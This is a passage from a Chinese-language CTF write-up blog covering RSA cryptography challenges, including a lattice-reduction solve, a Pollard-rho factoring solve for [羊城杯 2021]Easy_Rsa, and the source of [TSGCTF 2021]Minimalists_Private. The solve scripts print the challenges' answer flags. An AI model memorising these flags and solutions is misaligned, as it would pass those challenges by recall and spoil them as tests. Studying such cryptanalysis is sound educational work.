style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">构</span><span class="mord cjk_fallback">造</span><span class="mord cjk_fallback">格</span><span class="mord mathnormal">L</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.4000000000000004em;vertical-align:-0.9500000000000004em;"></span><span class="mopen">(</span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span></span></span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">)</span><span class="mord mathnormal">L</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span></span></p><h2 id="exp-23"><a class="markdownIt-Anchor" href="#exp-23"></a> exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">11223534598141520071392544441952727165225232358333005778273904279807651365082135278999006409297342081157139972503703772556228315654837441044781410960887536342197257046095815516053582104516752168718754752274252871063410625756822861003235434929734796245933907621657696650609132419469456238860601166224944487116</span><br>n = <span class="hljs-number">99499509473364452726944770421623721217675378717234178828554602484867641740497277374806036356486848621495917213623425604565104435195783450029879177770305417469850119739921527698744700219067563802483159458398895082044997907953256062342593605652927874232404778144112740505724215742062859322375891810785229735653</span><br>M = <span class="hljs-number">28858066896535909755146975040720031655813099454455588895434479778600245612915775220883088811806723015938061791264869678085304248608125313205719043320256733514389739252845381708094678596099621503299764646358765107958130065721737938646850422959290465490270263553423913213684958592738500488797707239673645370968467090153285601432966586133693641854092761919184904521240074718850103356119966387029699913571443658384564840234765103070736676067458391659605655580766436276719610283460962533141261830775028138998594269732067550977245136631815804641115446066102981044849495663224005844657686979516481904043008222498344271373989609634617315702887646444506965035406154183377067490922195507071571055579654138590566650703038341939225657159668601565182939447340585110418258653618384852356058444795156595720943362884361136229430356254095673818462046182310826133487611183265532844700265640889105864909560170846171486510513240630480729194415061752698286990999064594811803482429976978688266632277914610443963726561921790718480343488391563503774868490108659902216386976683532579945706490286814310031310144410303859633785939399012605326754445715302492704458881700872467560968264583996658711892595658439058034434031646411995511168849724976850557976639662545139917517675296224197763447929417263845949813741362574641118781293171167041592771305352186419565096347024619027397784780864922205105185970180629777320680707022011697404359388540366320053501502698747763307336114482530784826238326983596966436776918503653153420281803168537703048371580451</span><br>hint = <span class="hljs-number">24302462761412867722556483860201357169283131384498485449193507018526006760633350601593235386242712333885826513399701577522498685938541691414316724804357523659514319083860507720945068584985970098437482386854188516742033184163273293005356970701527614010961471490166306765208284126815267752826036846338185010168551115391901008731195800723630612524215610302192763771954146943262822909368086155537366851998954401585888789660061750804720858175620022924944428882337005545535959410243692854073069775794945154943244522898330286785483043492678802461244624116832548150221211726044545331789932659966539042635768789637635754297830131948383991027466194455817875377950516103513735000718642093769229006510961952865719649517629939801014585849419818774317178973918720330390674833583065434312010539617630210110724391629534996688713945139529416075521015600392479980677759342058040778532467875961508475990300178277703011765698425360329342396347848373844031930655143343217447877587074485794273364964346235973542157189093330870952677683308479410235841331914353677363106473914986073397716367455628483060709281215783434084559550690248426391913205234184130354155776334292729262232484610747771114078013979494659835579574006801652858265173309736540235377076956677464263798132149783780830729103485354096234062135454873557941791812722418582207577124971978987895472250326100927372068822672582017222521124179752698654114839303426099426224351872025466618402675104161895600513776962289703455252021742990686505176582638132300246212598903123706906104217087</span><br><br>L = matrix(ZZ, [[<span class="hljs-number">1</span>, hint],[<span class="hljs-number">0</span>, M]])<br>v = L.LLL()<br>v = v[<span class="hljs-number">0</span>]<br>s, p = <span class="hljs-built_in">map</span>(<span class="hljs-built_in">abs</span>, v)<br>p=p+<span class="hljs-number">297498275426</span><br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">pow</span>(c,invert(e,(p-<span class="hljs-number">1</span>)*(n//p-<span class="hljs-number">1</span>)),n))))<br><span class="hljs-comment">#b&#x27;flag&#123;388bb794-ccda-f02e-79c6-8e44659c2481&#125;&#x27;</span><br><span class="hljs-comment">#NSSCTF&#123;388bb794-ccda-f02e-79c6-8e44659c2481&#125;</span><br></code></pre></td></tr></table></figure><h1 id="羊城杯-2021easy_rsa"><a class="markdownIt-Anchor" href="#羊城杯-2021easy_rsa"></a> [羊城杯 2021]Easy_Rsa</h1><h2 id="题目-24"><a class="markdownIt-Anchor" href="#题目-24"></a> 题目</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">import</span> gmpy2<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gen_prime</span>(<span class="hljs-params">nbits, gamma</span>):<br>    g = getPrime(<span class="hljs-built_in">int</span>(nbits * gamma))<br>    alpha = <span class="hljs-number">0.5</span> - gamma<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        a = getRandomNBitInteger(<span class="hljs-built_in">int</span>(alpha * nbits))<br>        p = <span class="hljs-number">2</span> * g * a + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> isPrime(p):<br>            b = getRandomNBitInteger(<span class="hljs-built_in">int</span>(alpha * nbits))<br>            q = <span class="hljs-number">2</span> * g * b + <span class="hljs-number">1</span><br>            h = <span class="hljs-number">2</span> * g * a * b + a + b<br>            <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> isPrime(q) <span class="hljs-keyword">or</span> isPrime(h) <span class="hljs-keyword">or</span> gmpy2.gcd(a, b) != <span class="hljs-number">1</span>:<br>                b = getRandomNBitInteger(<span class="hljs-built_in">int</span>(alpha * nbits))<br>                q = <span class="hljs-number">2</span> * g * b + <span class="hljs-number">1</span><br>            <span class="hljs-keyword">return</span> p, q<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">nbits, gamma</span>):<br>    p, q = gen_prime(nbits, gamma)<br>    n = p * q<br>    e = getPrime(<span class="hljs-number">16</span>)<br>    <span class="hljs-keyword">while</span> gmpy2.gcd(e, gmpy2.lcm(p-<span class="hljs-number">1</span>,q-<span class="hljs-number">1</span>)) != <span class="hljs-number">1</span>:<br>        e = getPrime(<span class="hljs-number">16</span>)<br>    m = bytes_to_long(flag)<br>    c = <span class="hljs-built_in">pow</span>(m, e, n)<br>    <span class="hljs-keyword">return</span> n, e, c<br><br>n, e, c = encrypt(<span class="hljs-number">1024</span>, <span class="hljs-number">0.48</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;n =&#x27;</span>, n<br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;e =&#x27;</span>, e<br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;c =&#x27;</span>, c<br><br><span class="hljs-comment"># n = 84236796025318186855187782611491334781897277899439717384242559751095347166978304126358295609924321812851255222430530001043539925782811895605398187299748256080526691975084042025794113521587064616352833904856626744098904922117855866813505228134381046907659080078950018430266048447119221001098505107823645953039</span><br><span class="hljs-comment"># e = 58337</span><br><span class="hljs-comment"># c = 13646200911032594651110040891135783560995665642049282201695300382255436792102048169200570930229947213493204600006876822744757042959653203573780257603577712302687497959686258542388622714078571068849217323703865310256200818493894194213812410547780002879351619924848073893321472704218227047519748394961963394668</span><br></code></pre></td></tr></table></figure><h2 id="分析-24"><a class="markdownIt-Anchor" href="#分析-24"></a> 分析</h2><p>分析了半天，发现还是只会照搬wp</p><p>PollardRho 算法：</p><p><a href="https://www.cnblogs.com/RioTian/p/13928916.html">【快速因数分解】Pollard’s Rho 算法 - RioTian (cnblogs.com)</a></p><p>优化：方法来自<em>Cryptanalysis of RSA and It’s Variants</em>的<strong>Section 11.2 Factoring the Modulus</strong></p><p>将<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">x^2+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>改成了<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>x</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msup><mo>+</mo><mn>3</mn><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">x^{n-1}+3\quad mod(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">3</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></p><p>这个优化方法的原理我没找到</p><h2 id="exp-24"><a class="markdownIt-Anchor" href="#exp-24"></a> exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> invert<br><br>f = <span class="hljs-keyword">lambda</span> x,n: (<span class="hljs-built_in">pow</span>(x, n - <span class="hljs-number">1</span>, n) + <span class="hljs-number">3</span>) % n<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">phllard_rho</span>(<span class="hljs-params">n</span>):<br>    i = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        a = getRandomRange(<span class="hljs-number">2</span>, n)<br>        b = f(a, n)<br>        j = <span class="hljs-number">1</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            p = GCD(<span class="hljs-built_in">abs</span>(a - b), n)<br>            <span class="hljs-keyword">if</span> p == n:<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">elif</span> p &gt; <span class="hljs-number">1</span>:<br>                <span class="hljs-keyword">return</span> (p, n // p)<br>            <span class="hljs-keyword">else</span>:<br>                a = f(a, n)<br>                b = f(f(b, n), n)<br>            j += <span class="hljs-number">1</span><br>        i += <span class="hljs-number">1</span><br><br>n = <span class="hljs-number">84236796025318186855187782611491334781897277899439717384242559751095347166978304126358295609924321812851255222430530001043539925782811895605398187299748256080526691975084042025794113521587064616352833904856626744098904922117855866813505228134381046907659080078950018430266048447119221001098505107823645953039</span><br>c = <span class="hljs-number">13646200911032594651110040891135783560995665642049282201695300382255436792102048169200570930229947213493204600006876822744757042959653203573780257603577712302687497959686258542388622714078571068849217323703865310256200818493894194213812410547780002879351619924848073893321472704218227047519748394961963394668</span><br>e = <span class="hljs-number">58337</span><br><br>p,q = phllard_rho(n)<br>d = invert(e,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">pow</span>(c,d,n)))<br><span class="hljs-comment">#b&#x27;SangFor&#123;0a8c2220-4c1b-32c8-e8c1-adf92ec7678b&#125;&#x27;</span><br><span class="hljs-comment">#NSSCTF&#123;0a8c2220-4c1b-32c8-e8c1-adf92ec7678b&#125;</span><br></code></pre></td></tr></table></figure><h1 id="tsgctf-2021minimalists_private"><a class="markdownIt-Anchor" href="#tsgctf-2021minimalists_private"></a> [TSGCTF 2021]Minimalists_Private</h1><h2 id="题目-25"><a class="markdownIt-Anchor" href="#题目-25"></a> 题目</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> isPrime<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randrange<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> p, q, L, e, d<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RSA</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, p, q, L, e, d</span>):<br>        <span class="hljs-keyword">assert</span>(isPrime(p) <span class="hljs-keyword">and</span> isPrime(q))<br>        <span class="hljs-variable language_">self</span>.N = p * q<br>        <span class="hljs-variable language_">self</span>.L = L<br>        <span class="hljs-variable language_">self</span>.e = e<br>        <span class="hljs-variable language_">self</span>.d = d<br><br>        <span class="hljs-comment"># these are the normal RSA conditions</span><br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>            <span class="hljs-keyword">assert</span>(<span class="hljs-built_in">pow</span>(randrange(<span class="hljs-number">1</span>, <span class="hljs-variable language_">self</span>.N), <span class="hljs-variable language_">self</span>.L, <span class="hljs-variable language_">self</span>.N) == <span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">assert</span>(<span class="hljs-variable language_">self</span>.e * <span class="hljs-variable language_">self</span>.d % <span class="hljs-variable language_">self</span>.L == <span class="hljs-number">1</span>)<br><br>        <span class="hljs-comment"># minimal is the best</span><br>        <span class="hljs-keyword">assert</span>(<span class="hljs-variable language_">self</span>.L * <span class="hljs-variable language_">self</span>.L &lt;= <span class="hljs-number">10000</span> * <span class="hljs-variable language_">self</span>.N)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">gen_private_key</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-variable language_">self</span>.N, <span class="hljs-variable language_">self</span>.d)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">gen_public_key</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-variable language_">self</span>.N, <span class="hljs-variable language_">self</span>.e)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">self, msg</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">pow</span>(msg, <span class="hljs-variable language_">self</span>.e, <span class="hljs-variable language_">self</span>.N)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">self, c</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">pow</span>(c, <span class="hljs-variable language_">self</span>.d, <span class="hljs-variable language_">self</span>.N)<br><br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>msg = <span class="hljs-built_in">int</span>.from_bytes(flag, byteorder=<span class="hljs-string">&#x27;big&#x27;</span>)<br><span class="hljs-keyword">assert</span>(msg &lt; p * q)<br><br>rsa = RSA(p, q, L, e, d)<br>encrypted = rsa.encrypt(msg)<br><span class="hljs-keyword">assert</span>(rsa.decrypt(encrypted) == msg)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;N, e = <span class="hljs-subst">&#123;rsa.gen_public_key()&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;c = <span class="hljs-subst">&#123;encrypted&#125;</span>&#x27;</span>)<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">#requirements:pycryptodome == 3.9.9</span><br><span class="hljs-string"></span><br><span class="hljs-string">N, e = (1108103848370322618250236235096737547381026108763302516499816051432801216813681568375319595638932562835292256776016949573972732881586209527824393027428125964599378845347154409633878436868422905300799413838645686430352484534761305185938956589612889463246508935994301443576781452904666072122465831585156151, 65537)</span><br><span class="hljs-string">c = 254705401581808316199469430068831357413481187288921393400711004895837418302514065107811330660948313420965140464021505716810909691650540609799307500282957438243553742714371028405100267860418626513481187170770328765524251710154676478766892336610743824131087888798846367363259860051983889314134196889300426</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><h2 id="分析-25"><a class="markdownIt-Anchor" href="#分析-25"></a> 分析</h2><p>已知</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>a</mi><mi>L</mi></msup><mo>=</mo><mn>1</mn><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>N</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mi>e</mi><mo>∗</mo><mi>d</mi><mo>=</mo><mn>1</mn><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>L</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">a^L=1\quad mod(N)\\e*d=1\quad mod(L)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8913309999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913309999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">L</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">L</span><span class="mclose">)</span></span></span></span></span></p><p>根据费马小定理可以知道<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mo>=</mo><mfrac><mrow><mi>ϕ</mi><mo stretchy="false">(</mo><mi>N</mi><mo stretchy="false">)</mo></mrow><mi>k</mi></mfrac></mrow><annotation encoding="application/x-tex">L=\frac{\phi(N)}{k}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">L</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.355em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.01em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.485em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ϕ</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></p><p>又有</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>L</mi><mn>2</mn></msup><mo>≤</mo><mn>10000</mn><mo>∗</mo><mi>N</mi><mspace linebreak="newline"></mspace><mo stretchy="false">(</mo><mfrac><mrow><mi>ϕ</mi><mo stretchy="false">(</mo><mi>N</mi><mo stretchy="false">)</mo></mrow><mi>k</mi></mfrac><msup><mo stretchy="false">)</mo><mn>2</mn></msup><mo>≤</mo><mn>10000</mn><mo>∗</mo><mi>p</mi><mo>∗</mo><mi>q</mi><mspace linebreak="newline"></mspace><mi>ϕ</mi><mo stretchy="false">(</mo><mi>N</mi><msup><mo stretchy="false">)</mo><mn>2</mn></msup><mo>≤</mo><mn>10000</mn><mo>∗</mo><mi>p</mi><mo>∗</mo><mi>q</mi><mo>∗</mo><msup><mi>k</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">L^2≤10000*N\\(\frac{\phi(N)}{k})^2≤10000*p*q\\\phi(N)^2≤10000*p*q*k^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0000779999999998em;vertical-align:-0.13597em;"></span><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:2.113em;vertical-align:-0.686em;"></span><span class="mopen">(</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">ϕ</span><span 